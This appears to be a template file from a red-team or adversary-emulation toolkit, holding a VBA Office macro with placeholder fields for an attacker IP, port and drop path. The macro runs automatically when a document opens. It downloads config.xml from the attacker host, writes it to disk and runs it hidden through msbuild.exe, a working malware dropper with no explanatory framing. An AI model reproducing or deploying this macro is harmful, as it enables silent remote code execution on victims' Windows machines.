content: |
  Sub AutoOpen()
      Dim WinHttpReq As Object
      Dim oStream As Object
      Dim myURL As String
      Dim LocalFilePath As String
      Dim ExecFile As Double

      myURL = "http://{{ attacker_ip }}:{{ delivery_outbound_port }}/config.xml"
      LocalFilePath = "{{ delivery_path_windows }}\config.xml"

      Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
      WinHttpReq.Open "GET", myURL, False, "", ""
      WinHttpReq.send

      Set oStream = CreateObject("ADODB.Stream")
      oStream.Open
      oStream.Type = 1
      oStream.Write WinHttpReq.responseBody
      oStream.SaveToFile LocalFilePath, 2
      oStream.Close

      ExecFile = Shell("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe " & LocalFilePath, vbHide)
  End Sub
